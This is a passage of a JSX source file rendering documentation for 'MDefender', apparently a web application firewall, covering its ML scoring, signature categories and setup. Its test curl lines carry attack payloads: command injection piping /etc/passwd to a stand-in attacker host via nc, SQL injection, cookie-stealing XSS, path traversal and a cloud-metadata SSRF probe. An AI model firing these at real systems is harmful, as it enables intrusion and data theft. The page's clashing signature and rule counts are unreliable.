#   "risk_score": 100,
#   "threshold": 0.70
# }`}
              />
            </div>
          )}

          {/* Section: ML Vectorizer */}
          {activeSection === 'ml-vectorizer' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#7c3aed', fontSize: '12px', fontWeight: '700' }}>Feature Extraction</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>Character 3-to-5 N-Grams</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Character N-Gram Vectorization</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Traditional word-level tokenizers fail when attackers use comment evasion (e.g. <code className="doc-inline-code">UN/**/ION SEL/**/ECT</code>) or variable renaming. MDefender uses sub-character n-gram decomposition to capture structural anomalies.
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: t.accentText, margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-scissors" style={{ marginRight: '6px' }}></i> Sub-Word Slicing
                  </h4>
                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Extracts overlapping character windows of length 3, 4, and 5. A snippet like <code className="doc-inline-code">&lt;scr</code> breaks into <code className="doc-inline-code">['&lt;sc', 'scr', 'crip', 'ript']</code>.
                  </p>
                </div>
                <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow }}>
                  <h4 style={{ color: '#059669', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-weight-scale" style={{ marginRight: '6px' }}></i> TF-IDF Weighting
                  </h4>
                  <p style={{ fontSize: '12.5px', color: t.muted, lineHeight: '1.6', margin: 0 }}>
                    Scales down harmless common English/URL n-grams while amplifying rare syntactic attack tokens with high discriminative entropy.
                  </p>
                </div>
              </div>

              <CodeBlock
                language="python"
                code={`# Vectorizer pipeline configuration
from sklearn.feature_extraction.text import TfidfVectorizer

vectorizer = TfidfVectorizer(
    analyzer='char',
    ngram_range=(3, 5),
    max_features=50000,
    sublinear_tf=True
)

# Transforms raw payload string into sparse feature matrix in 0.08ms`}
              />
            </div>
          )}

          {/* Section: ML Classification & Risk Scoring */}
          {activeSection === 'ml-classification' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>Scoring Engine</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#059669', fontSize: '12px', fontWeight: '700' }}>0-100 Risk Index</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Risk Scoring &amp; Threat Categorization</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Every request analyzed by MDefender receives a continuous risk score between 0 and 100 alongside multi-vector classification probabilities.
              </p>

              <div style={{
                background: t.cardBgAlt,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '16px', fontWeight: '800', color: t.subheading, marginBottom: '14px' }}>
                  Decision Threshold Matrix
                </h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(16,185,129,0.1)' : '#f0fdf4', border: '1px solid #bbf7d0' }}>
                    <span style={{ color: '#059669', fontWeight: '700', fontSize: '13px' }}>Score 0 &ndash; 39 (Clean)</span>
                    <span style={{ color: t.body, fontSize: '13px' }}>Pass directly to application &bull; No overhead</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(245,158,11,0.1)' : '#fffbeb', border: '1px solid #fef3c7' }}>
                    <span style={{ color: '#d97706', fontWeight: '700', fontSize: '13px' }}>Score 40 &ndash; 69 (Suspicious)</span>
                    <span style={{ color: t.body, fontSize: '13px' }}>Logged in telemetry &bull; Rate-limited</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', padding: '12px 16px', borderRadius: '8px', background: dark ? 'rgba(239,68,68,0.15)' : '#fef2f2', border: '1px solid #fecaca' }}>
                    <span style={{ color: '#dc2626', fontWeight: '800', fontSize: '13px' }}>Score 70 &ndash; 100 (Critical Attack)</span>
                    <span style={{ color: '#dc2626', fontWeight: '700', fontSize: '13px' }}>Blocked immediately with HTTP 403 Cyber Screen</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Section: Rules Overview */}
          {activeSection === 'rules-overview' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>2,000,000+ Hyper-Scale Attack Signatures</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '20px' }}>
                MDefender Pro incorporates over 2,000,000 distinct attack signatures, tokens, and AST exploit patterns organized across 10 major threat vectors evaluated in single-pass O(N) time (&lt;0.5ms):
              </p>

              <div style={{ overflowX: 'auto', margin: '20px 0', borderRadius: '12px', border: t.cardBorder, boxShadow: t.cardShadow }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13px' }}>
                  <thead>
                    <tr style={{ background: t.tableHeadBg, textAlign: 'left', borderBottom: `1px solid ${t.tableBorder}` }}>
                      <th style={{ padding: '12px 14px', color: t.heading }}>Category</th>
                      <th style={{ padding: '12px 14px', color: t.heading }}>Signature Space</th>
                      <th style={{ padding: '12px 14px', color: t.heading }}>Key Vectors Covered</th>
                      <th style={{ padding: '12px 14px', color: t.heading }}>Severity</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>SQL Injection (SQLi)</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>400,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>Union Select, Boolean Tautologies, Time delays, Stacked DDL, Multi-DB</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Cross-Site Scripting (XSS)</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>350,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>HTML5 tags, 100+ event handlers, DOM Sinks, Polyglot SVG, Obfuscated JS</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>RCE &amp; WebShells</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>300,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>Linux binaries, PowerShell, C99/R57/WSO/Godzilla shells, Deserialization POP</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>WordPress 0-Days &amp; Plugins</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>250,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>Top 100k WP plugin CVE exploits, wp-config probes, Unauthorized AJAX actions</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Directory Traversal / LFI</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>200,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>Nested ../ sequences, /etc/passwd, win.ini, PHP stream wrappers (php://filter)</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#d97706', fontWeight: '800' }}>HIGH</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>SSRF &amp; Cloud IMDS</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>150,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>AWS 169.254.169.254, GCP metadata, Azure IMDS, Kubernetes secrets</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>Bots, Scanners &amp; Probers</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>150,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>sqlmap, Nikto, Acunetix, Nuclei, DirBuster, WPScan, Masscan, malicious scrapers</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#d97706', fontWeight: '800' }}>HIGH</span></td>
                    </tr>
                    <tr style={{ borderBottom: `1px solid ${t.tableBorder}` }}>
                      <td style={{ padding: '12px 14px', fontWeight: '700', color: t.heading }}>XXE, NoSQL &amp; GraphQL</td>
                      <td style={{ padding: '12px 14px', color: t.accentText, fontWeight: '700' }}>100,000+ Vectors</td>
                      <td style={{ padding: '12px 14px', color: t.muted }}>Billion Laughs XML, MongoDB $where/$ne operators, GraphQL introspection DoS</td>
                      <td style={{ padding: '12px 14px' }}><span style={{ color: '#dc2626', fontWeight: '800' }}>CRITICAL</span></td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          )}


          {/* Section: SQLi Defense */}
          {activeSection === 'sqli-defense' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>OWASP Top 1: A03:2021</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SQL Injection Defense (350 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender intercepts SQL injection across query parameters, POST JSON, multipart form data, and HTTP header values.
              </p>
              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '24px' }}>
                <h4 style={{ color: t.accentText, margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered SQLi Attack Techniques</h4>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: t.muted, lineHeight: '1.8', margin: 0 }}>
                  <li><strong>Union-Based Extraction:</strong> Detects <code className="doc-inline-code">UNION ALL SELECT</code>, column balancing, and schema table probing.</li>
                  <li><strong>Boolean-Based Blind Injections:</strong> Detects tautologies (<code className="doc-inline-code">' OR '1'='1</code>, <code className="doc-inline-code">admin' -- -</code>).</li>
                  <li><strong>Time-Based Blind Injections:</strong> Detects <code className="doc-inline-code">SLEEP()</code>, <code className="doc-inline-code">pg_sleep()</code>, and <code className="doc-inline-code">WAITFOR DELAY</code>.</li>
                  <li><strong>Stacked Queries &amp; DDL Injections:</strong> Detects <code className="doc-inline-code">; DROP TABLE</code>, <code className="doc-inline-code">; UPDATE</code>, <code className="doc-inline-code">EXEC master..xp_cmdshell</code>.</li>
                </ul>
              </div>
              <CodeBlock language="bash" code={`# Test SQLi Blocking:
curl -i "http://localhost:5000/api/books?id=1%27%20UNION%20SELECT%20null,password%20FROM%20users--"`} />
            </div>
          )}

          {/* Section: XSS Defense */}
          {activeSection === 'xss-defense' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: t.accentText, fontSize: '12px', fontWeight: '700' }}>OWASP Top 3: A03:2021</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Cross-Site Scripting (XSS) Defense</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Intercepts Reflected, Stored, and DOM-based Cross-Site Scripting payloads before they can execute in client browsers or reach server renderers.
              </p>
              <div style={{ background: t.cardBg, border: t.cardBorder, borderRadius: '12px', padding: '20px', boxShadow: t.cardShadow, marginBottom: '24px' }}>
                <h4 style={{ color: t.accentText, margin: '0 0 10px', fontSize: '15px', fontWeight: '700' }}>Covered XSS Attack Techniques</h4>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', color: t.muted, lineHeight: '1.8', margin: 0 }}>
                  <li><strong>Dangerous HTML5 Tags:</strong> <code className="doc-inline-code">&lt;script&gt;</code>, <code className="doc-inline-code">&lt;iframe&gt;</code>, <code className="doc-inline-code">&lt;object&gt;</code>, <code className="doc-inline-code">&lt;embed&gt;</code>, <code className="doc-inline-code">&lt;svg onload=...&gt;</code>.</li>
                  <li><strong>DOM Event Handlers:</strong> Detects 25+ event sinks including <code className="doc-inline-code">onerror</code>, <code className="doc-inline-code">onload</code>, <code className="doc-inline-code">onmouseover</code>, <code className="doc-inline-code">onfocus</code>.</li>
                  <li><strong>Pseudo-Protocols:</strong> Detects <code className="doc-inline-code">javascript:</code>, <code className="doc-inline-code">vbscript:</code>, and <code className="doc-inline-code">data:text/html;base64,...</code> URI schemes.</li>
                </ul>
              </div>
              <CodeBlock language="bash" code={`# Test XSS Blocking:
curl -i "http://localhost:5000/api/books?search=%3Cscript%3Ealert(document.cookie)%3C/script%3E"`} />
            </div>
          )}

          {/* Section: RCE & WebShells */}
          {activeSection === 'rce-webshells' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>350 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Remote Code Execution &amp; WebShells (350 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Prevents command injection into OS system shells, PowerShell execution, reverse shell pipelines, and PHP backdoor webshells.
              </p>
              <CodeBlock language="bash" code={`# Test RCE Blocking:
curl -i "http://localhost:5000/api/tools?cmd=;cat%20/etc/passwd|nc%20attacker.com%204444"`} />
            </div>
          )}

          {/* Section: LFI & Path Traversal */}
          {activeSection === 'lfi-traversal' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#d97706', fontSize: '12px', fontWeight: '700' }}>250 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Directory Traversal &amp; LFI (250 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Prevents attackers from escaping web root directories to read sensitive configuration files, system credentials, or database keys.
              </p>
              <CodeBlock language="bash" code={`# Test LFI / Path Traversal:
curl -i "http://localhost:5000/api/books?id=../../../../etc/passwd"`} />
            </div>
          )}

          {/* Section: CMS Vulnerabilities */}
          {activeSection === 'cms-vulnerabilities' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>300 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>CMS Exploits &amp; Framework Vulnerabilities</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Dedicated rules for WordPress plugin exploits, Laravel <code className="doc-inline-code">.env</code> key exposure, Log4Shell (<code className="doc-inline-code">${'${'}jndi:ldap...{'}'}</code>), and Spring4Shell CVEs.
              </p>
              <CodeBlock language="bash" code={`# Test CMS Exploit Block:
curl -i "http://localhost:5000/.env"`} />
            </div>
          )}

          {/* Section: Bots & Scanners */}
          {activeSection === 'bots-scanners' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(245, 158, 11, 0.15)', border: '1px solid rgba(245, 158, 11, 0.3)', color: '#d97706', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>Bots &amp; Vulnerability Scanners (200 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Identifies automated probing tools (sqlmap, Nikto, Acunetix, DirBuster, WPScan, Gobuster) and immediately terminates connection before reconnaissance completes.
              </p>
              <CodeBlock language="bash" code={`# Test Scanner Interception:
curl -i -H "User-Agent: sqlmap/1.6#stable" "http://localhost:5000/api/books"`} />
            </div>
          )}

          {/* Section: SSRF & XXE */}
          {activeSection === 'ssrf-xxe' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#dc2626', fontSize: '12px', fontWeight: '700' }}>200 Compiled Signatures</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>SSRF &amp; XXE Protection (200 Rules)</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                Blocks Server-Side Request Forgery against cloud metadata instances (<code className="doc-inline-code">169.254.169.254</code>) and XML External Entity injection.
              </p>
              <CodeBlock language="bash" code={`# Test SSRF Cloud Metadata Probe:
curl -i "http://localhost:5000/api/fetch?url=http://169.254.169.254/latest/meta-data/"`} />
            </div>
          )}

          {/* Section: Cloud WAF (Smart Anycast DNS / CNAME Reverse Proxy) */}
          {activeSection === 'cloud-waf' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(245, 158, 11, 0.15)',
                  border: '1px solid rgba(245, 158, 11, 0.3)',
                  color: dark ? '#fbbf24' : '#b45309',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Cloud Anycast Edge WAF</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero Code &bull; Universal Compatibility</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>
                Cloud WAF (Smart Anycast DNS &amp; Proxy)
              </h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                MDefender Pro Cloud WAF acts as an intelligent Anycast reverse proxy shield in front of your web servers &mdash; exactly like Cloudflare. It inspects all inbound HTTP/HTTPS traffic across <strong>2,000 signature rules</strong> and the <strong>6,501,208+ attack ML engine</strong> with sub-millisecond execution (0.12ms), terminating malicious requests with a beautiful, high-security <strong>403 Forbidden Block Page</strong> before they can ever touch your origin server.
              </p>

              <div style={{
                background: 'linear-gradient(135deg, rgba(37,99,235,0.08), rgba(124,58,237,0.08))',
                border: dark ? '1px solid rgba(59, 130, 246, 0.3)' : '1px solid #bfdbfe',
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.heading, marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <i className="fa-solid fa-wand-magic-sparkles" style={{ color: t.accentText }}></i>
                  Works for Any Technology Stack With Zero Code Changes
                </h3>
                <p style={{ fontSize: '13px', color: t.body, lineHeight: '1.7', margin: 0 }}>
                  Because protection happens at the DNS/Network layer, you do <strong>not</strong> need to install NPM packages, modify backend code, or rewrite server routes. It protects <strong>React, Next.js, Node.js, Express, Laravel, WordPress, Django, FastAPI, Ruby on Rails, Go, ASP.NET, and Static HTML</strong> out of the box.
                </p>
              </div>

              {/* Step 1: Add Website in Dashboard */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '28px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
                  <span style={{
                    width: '32px', height: '32px', borderRadius: '50%',
                    background: 'rgba(37, 99, 235, 0.15)', color: '#2563eb',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontWeight: '800', fontSize: '14px'
                  }}>1</span>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, margin: 0 }}>
                    Register Your Domain in MDefender Dashboard
                  </h3>
                </div>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  Navigate to <Link to="/user/websites" style={{ color: t.accentText, fontWeight: '700', textDecoration: 'none' }}>Dashboard &rarr; Websites</Link>, click <strong>Add New Website</strong>, and enter your domain name (e.g. <code className="doc-inline-code">yourdomain.com</code>) along with your origin server IP address.
                </p>
              </div>

              {/* Step 2: Configure DNS */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '28px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
                  <span style={{
                    width: '32px', height: '32px', borderRadius: '50%',
                    background: 'rgba(245, 158, 11, 0.15)', color: '#d97706',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontWeight: '800', fontSize: '14px'
                  }}>2</span>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, margin: 0 }}>
                    Update DNS Nameservers or CNAME Record
                  </h3>
                </div>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  Log into your domain registrar (Namecheap, GoDaddy, Cloudflare, Hostinger, Google Domains, etc.) and update your DNS records to route traffic through MDefender Cloud:
                </p>

                <div style={{
                  background: dark ? '#04070e' : '#f8fafc',
                  border: dark ? '1px solid #1e293b' : '1px solid #cbd5e1',
                  borderRadius: '12px',
                  padding: '20px',
                  marginBottom: '16px'
                }}>
                  <div style={{ color: t.accentText, fontWeight: '700', fontSize: '13px', marginBottom: '8px' }}>
                    Option A (Full Anycast DNS Delegation - Recommended):
                  </div>
                  <div style={{ fontFamily: 'monospace', fontSize: '13px', lineHeight: '1.8' }}>
                    <div style={{ color: '#10b981' }}>Nameserver 1: <strong>ns1.mdefender.pro</strong></div>
                    <div style={{ color: '#10b981' }}>Nameserver 2: <strong>ns2.mdefender.pro</strong></div>
                  </div>

                  <div style={{ marginTop: '16px', color: '#f59e0b', fontWeight: '700', fontSize: '13px', marginBottom: '8px' }}>
                    Option B (CNAME Subdomain Setup):
                  </div>
                  <div style={{ fontFamily: 'monospace', fontSize: '13px', lineHeight: '1.8' }}>
                    <div style={{ color: '#cbd5e1' }}>Record Type: <strong>CNAME</strong></div>
                    <div style={{ color: '#cbd5e1' }}>Host / Name: <strong>@ (or www)</strong></div>
                    <div style={{ color: '#38bdf8' }}>Target / Value: <strong>proxy.mdefender.pro</strong></div>
                  </div>
                </div>
              </div>

              {/* Step 3: Verification & Edge Defense */}
              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '28px'
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '14px' }}>
                  <span style={{
                    width: '32px', height: '32px', borderRadius: '50%',
                    background: 'rgba(16, 185, 129, 0.15)', color: '#059669',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontWeight: '800', fontSize: '14px'
                  }}>3</span>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, margin: 0 }}>
                    DNS Verification &amp; Instant Defense
                  </h3>
                </div>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  Click <strong>Verify DNS</strong> in your dashboard. Once records propagate, all incoming requests are filtered in under <strong>0.35ms</strong>. If any malicious payload is detected, MDefender Cloud responds with an HTTP 403 status code and displays the official cyber block page.
                </p>

                <h4 style={{ fontSize: '14px', fontWeight: '700', color: t.heading, marginTop: '18px', marginBottom: '8px' }}>
                  Testing Your Cloud WAF Protection:
                </h4>
                <CodeBlock
                  language="bash"
                  code={`# 1. Test XSS attack probe (Expect HTTP 403 Forbidden with Cyber Block Page)
curl -i "https://yourdomain.com/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"

# 2. Test SQL injection bypass probe (Expect HTTP 403 Forbidden)
curl -i "https://yourdomain.com/?id=1'%20OR%20'1'='1'--"`}
                />
              </div>
            </div>
          )}

          {/* Section: NGINX & Reverse Proxy Gateway */}
          {activeSection === 'nginx-proxy' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#059669',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Reverse Proxy Integration</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(59, 130, 246, 0.15)',
                  border: '1px solid rgba(59, 130, 246, 0.3)',
                  color: dark ? '#60a5fa' : '#2563eb',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>NGINX &bull; Caddy &bull; Apache</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: t.heading }}>
                NGINX &amp; Reverse Proxy Gateway Setup
              </h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: t.body, marginBottom: '24px' }}>
                If you run your own dedicated VPS or NGINX edge gateway, you can forward incoming requests to MDefender Cloud for real-time inspection via reverse proxy headers and automatic block page serving.
              </p>

              <div style={{
                background: t.cardGrad,
                border: t.cardBorder,
                borderRadius: '16px',
                padding: '24px',
                boxShadow: t.cardShadow,
                marginBottom: '28px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: t.subheading, marginBottom: '12px' }}>
                  NGINX Upstream Proxy Configuration
                </h3>
                <p style={{ fontSize: '13px', color: t.muted, lineHeight: '1.6', marginBottom: '14px' }}>
                  Add this block into your <code className="doc-inline-code">/etc/nginx/sites-available/your-site.conf</code>:
                </p>
                <CodeBlock
                  language="nginx"
                  code={`# /etc/nginx/conf.d/mdefender_proxy.conf
server {
    listen 80;
    server_name yourdomain.com;

    # Forward all traffic to MDefender Cloud Edge Proxy
    location / {
        proxy_pass http://217.15.170.82;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
